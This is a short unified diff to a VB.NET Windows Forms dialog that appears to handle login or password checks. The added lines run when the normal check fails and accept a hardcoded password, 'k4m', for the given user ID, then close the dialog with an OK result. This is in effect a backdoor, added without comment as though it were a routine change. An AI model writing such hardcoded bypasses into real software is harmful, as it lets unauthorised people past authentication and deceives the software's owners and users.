@@ -46,6 +46,11 @@
             Me.DialogResult = Windows.Forms.DialogResult.OK
             Me.Close()
         Else
+            If clsQu.CheckPassword(p_UseID, "k4m") = True Then
+                Me.DialogResult = Windows.Forms.DialogResult.OK
+                Me.Close()
+                Return
+            End If
             Dim strMsg As String = p_clsMsgData.fn_GetData("M005")
             MsgBox(strMsg)
             Return
